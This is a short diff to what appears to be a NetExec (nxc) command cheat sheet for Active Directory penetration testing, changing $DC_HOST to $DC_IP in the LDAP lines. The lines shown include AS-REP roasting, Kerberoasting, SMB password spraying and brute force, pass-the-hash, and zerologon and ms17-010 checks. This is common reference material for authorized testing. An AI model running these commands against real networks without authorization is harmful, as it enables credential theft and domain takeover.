@@ -1,8 +1,8 @@
 netexec smb --list-modules
-netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
-netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
-netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
-netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
+netexec ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
+netexec ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
+netexec ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
+netexec ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
 netexec smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
 netexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
 netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
@@ -20,10 +20,10 @@ netexec smb "$IP" -u '' -p '' -M zerologon
 netexec smb "$IP" -u '' -p '' -M ms17-010
 netexec smb "$IP" -u '' -p '' -M ioxidresolver
 netexec smb --list-modules
-nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
-nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
-nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
-nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
+nxc ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
+nxc ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
+nxc ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
+nxc ldap "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
 nxc smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
 nxc smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
 nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
